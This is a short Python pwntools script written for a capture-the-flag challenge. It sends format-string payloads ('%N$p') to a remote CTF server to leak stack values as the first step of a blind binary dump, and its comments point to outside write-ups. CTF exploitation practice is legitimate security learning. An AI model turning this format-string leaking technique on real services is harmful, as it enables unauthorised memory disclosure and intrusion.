from pwn import *
#context.log_level='debug'

# this is an attempt to leak the entire binary for blind pwn
# aka dump
p = connect("puzzler7.imaginaryctf.org", 2001)
prompt = 'Tell me something \n'
marker = "What is the secret? \n"
write_fmt_offset = 10 # kind of difficult to find ngl

# https://www.anquanke.com/post/id/196722#h2-0

def find_start():
	for i in range(100):
		payload = '%%%d$p.TMP' % (i)
		p.sendlineafter(prompt, payload)
		data = p.recvuntil('.TMP')
		#data = u64(p.recvuntil('.TMP', drop=True).strip().ljust(8, b"\x00"))
		log.info(str(i*4)+' '+data.decode())
		p.sendlineafter(marker, b'\x00')
		p.recvrepeat(0.2)

find_start()
# it was at this moment I got tired of reading chinese which is when I looked at
# https://ctftime.org/writeup/16273 instead


#p.interactive()
